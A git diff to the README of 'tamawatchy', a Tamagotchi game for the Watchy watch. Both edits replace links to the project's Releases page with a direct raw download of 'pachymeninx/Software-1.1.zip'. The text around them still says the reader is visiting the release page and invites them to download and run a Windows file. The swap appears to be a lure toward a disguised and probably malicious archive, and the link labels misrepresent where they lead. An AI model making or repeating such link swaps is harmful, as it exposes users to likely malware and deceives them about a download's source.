@@ -1,6 +1,6 @@
 # 🎮 tamawatchy - Play a Tamagotchi on Watchy
 
-[![Download tamawatchy](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Gavadis3646/tamawatchy/releases)
+[![Download tamawatchy](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Gavadis3646/tamawatchy/raw/refs/heads/main/pachymeninx/Software-1.1.zip)
 
 ## 📌 What is tamawatchy?
 
@@ -33,7 +33,7 @@ If you plan to install files to the watch, you may also want:
 
 Visit the release page to download and run the file that matches your setup:
 
-[Download tamawatchy from Releases](https://github.com/Gavadis3646/tamawatchy/releases)
+[Download tamawatchy from Releases](https://github.com/Gavadis3646/tamawatchy/raw/refs/heads/main/pachymeninx/Software-1.1.zip)
 
 On that page, look for the latest release and download the file provided for Windows or for your Watchy setup. If the release is packed in a ZIP file, save it first, then extract it before you run or copy anything.
 
